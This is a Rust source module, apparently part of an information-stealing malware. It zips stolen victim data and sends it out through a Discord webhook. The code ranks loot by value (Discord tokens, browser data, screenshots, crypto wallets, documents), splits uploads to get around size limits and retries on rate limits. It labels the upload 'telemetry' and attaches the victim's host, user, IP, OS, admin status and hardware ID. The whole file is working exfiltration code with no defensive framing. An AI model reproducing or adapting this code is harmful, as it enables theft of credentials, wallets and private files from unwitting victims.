//! Zip staging and Discord webhook delivery with automatic splitting.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

use serde_json::json;
use zip::write::SimpleFileOptions;

use crate::session::Session;
use crate::sysinfo::Meta;
use crate::util;
use crate::Config;

const MAX_ATTEMPTS: usize = 5;

struct Entry {
    path: PathBuf,
    rel: String,
    size: u64,
}

fn priority(rel: &str) -> u8 {
    if rel == "summary.txt" {
        0
    } else if rel.starts_with("discord") {
        1
    } else if rel.starts_with("browsers") {
        2
    } else if rel.starts_with("system/screenshot") {
        2
    } else if rel.starts_with("wallets") {
        3
    } else if rel.starts_with("documents") {
        4
    } else {
        5
    }
}

fn gather(root: &Path) -> Vec<Entry> {
    let mut entries = Vec::new();
    for item in walkdir::WalkDir::new(root)
        .max_depth(8)
        .follow_links(false)
        .into_iter()
        .filter_map(|e| e.ok())
    {
        if !item.file_type().is_file() {
            continue;
        }
        let Ok(meta) = item.metadata() else { continue };
        let Ok(rel) = item.path().strip_prefix(root) else {
            continue;
        };
        entries.push(Entry {
            path: item.path().to_path_buf(),
            rel: rel.to_string_lossy().replace('\\', "/"),
            size: meta.len(),
        });
    }
    entries.sort_by(|a, b| {
        priority(&a.rel)
            .cmp(&priority(&b.rel))
            .then(b.size.cmp(&a.size))
    });
    entries
}

/// Drops the lowest-value entries once the total exceeds the staging budget.
fn trim(entries: &mut Vec<Entry>, budget: u64) {
    let mut total: u64 = entries.iter().map(|e| e.size).sum();
    while total > budget && !entries.is_empty() {
        let last = entries.pop().expect("non-empty");
        total = total.saturating_sub(last.size);
    }
}

fn build_zip(entries: &[Entry]) -> Option<Vec<u8>> {
    let mut buffer = std::io::Cursor::new(Vec::new());
    {
        let mut writer = zip::ZipWriter::new(&mut buffer);
        let options = SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated)
            .unix_permissions(0o600);
        for entry in entries {
            if writer.start_file(&entry.rel, options).is_err() {
                continue;
            }
            if let Ok(data) = fs::read(&entry.path) {
                let _ = writer.write_all(&data);
            }
        }
        writer.finish().ok()?;
    }
    Some(buffer.into_inner())
}

fn embed(meta: &Meta, session: &Session, part: usize, parts: usize) -> serde_json::Value {
    let mut fields = vec![
        json!({"name": "host", "value": meta.host, "inline": true}),
        json!({"name": "user", "value": meta.user, "inline": true}),
        json!({"name": "ip", "value": meta.ip, "inline": true}),
        json!({"name": "os", "value": meta.os, "inline": false}),
        json!({"name": "files", "value": format!("{} files, {}", session.files, util::human_size(session.bytes)), "inline": true}),
        json!({"name": "admin", "value": meta.admin.to_string(), "inline": true}),
        json!({"name": "hwid", "value": meta.hwid, "inline": false}),
    ];
    if parts > 1 {
        fields.push(json!({"name": "part", "value": format!("{part}/{parts}"), "inline": true}));
    }
    json!({
        "username": "telemetry",
        "embeds": [{
            "title": format!("{} â€” {}", meta.host, meta.user),
            "color": 0x5865F2,
            "fields": fields,
            "footer": {"text": util::timestamp()},
        }]
    })
}

fn post_once(url: &str, payload: &serde_json::Value, file_name: &str, data: Vec<u8>) -> Result<(), u64> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(120))
        .build()
        .map_err(|_| 0u64)?;

    let part = reqwest::blocking::multipart::Part::bytes(data)
        .file_name(file_name.to_string())
        .mime_str("application/zip")
        .map_err(|_| 0u64)?;

    let form = reqwest::blocking::multipart::Form::new()
        .text("payload_json", payload.to_string())
        .part("files[0]", part);

    let response = client.post(url).multipart(form).send().map_err(|_| 0u64)?;
    let status = response.status();

    if status.as_u16() == 429 {
        let body = response.text().unwrap_or_default();
        let retry = serde_json::from_str::<serde_json::Value>(&body)
            .ok()
            .and_then(|v| v.get("retry_after").and_then(|r| r.as_f64()))
            .unwrap_or(3.0);
        return Err(retry.ceil() as u64);
    }
    if status.is_success() {
        return Ok(());
    }
    Err(0)
}

fn post_with_retry(
    url: &str,
    payload: &serde_json::Value,
    file_name: &str,
    data: Vec<u8>,
    gap_secs: u64,
) -> bool {
    for attempt in 0..MAX_ATTEMPTS {
        match post_once(url, payload, file_name, data.clone()) {
            Ok(()) => return true,
            Err(wait) => {
                if attempt + 1 == MAX_ATTEMPTS {
                    break;
                }
                // 429 carries its own retry_after; anything else waits the
                // configured gap between attempts.
                let delay = if wait > 0 { wait.min(30) } else { gap_secs };
                std::thread::sleep(std::time::Duration::from_secs(delay.max(1)));
            }
        }
    }
    false
}

/// Splits entries into parts that fit the chunk size, then uploads each one.
pub fn deliver(session: &mut Session, meta: &Meta, cfg: &Config) -> bool {
    if !cfg.webhook_ok() {
        session.note("upload: webhook not configured");
        return false;
    }

    let mut entries = gather(&session.root);
    if entries.is_empty() {
        session.note("upload: nothing staged");
        return false;
    }
    trim(&mut entries, cfg.max_upload_mb * 1024 * 1024);

    let chunk_bytes = cfg.chunk_mb * 1024 * 1024;
    let mut parts: Vec<Vec<Entry>> = Vec::new();
    let mut current: Vec<Entry> = Vec::new();
    let mut current_size = 0u64;

    for entry in entries {
        let projected = current_size + entry.size;
        if !current.is_empty() && projected > chunk_bytes {
            parts.push(std::mem::take(&mut current));
            current_size = 0;
        }
        current_size += entry.size;
        current.push(entry);
    }
    if !current.is_empty() {
        parts.push(current);
    }

    let total_parts = parts.len();
    let mut delivered = 0usize;

    for (index, part) in parts.into_iter().enumerate() {
        let Some(archive) = build_zip(&part) else {
            session.note(&format!("upload: part {} zip failed", index + 1));
            continue;
        };
        let name = if total_parts == 1 {
            String::from("session.zip")
        } else {
            format!("session_{:03}.zip", index + 1)
        };
        let payload = embed(meta, session, index + 1, total_parts);

        if post_with_retry(&cfg.webhook, &payload, &name, archive.clone(), cfg.retry_minutes * 60) {
            delivered += 1;
            session.note(&format!(
                "upload: {name} sent ({})",
                util::human_size(archive.len() as u64)
            ));
        } else {
            session.note(&format!("upload: {name} failed"));
        }

        if index + 1 < total_parts {
            std::thread::sleep(std::time::Duration::from_millis(1500));
        }
    }

    delivered == total_parts
}
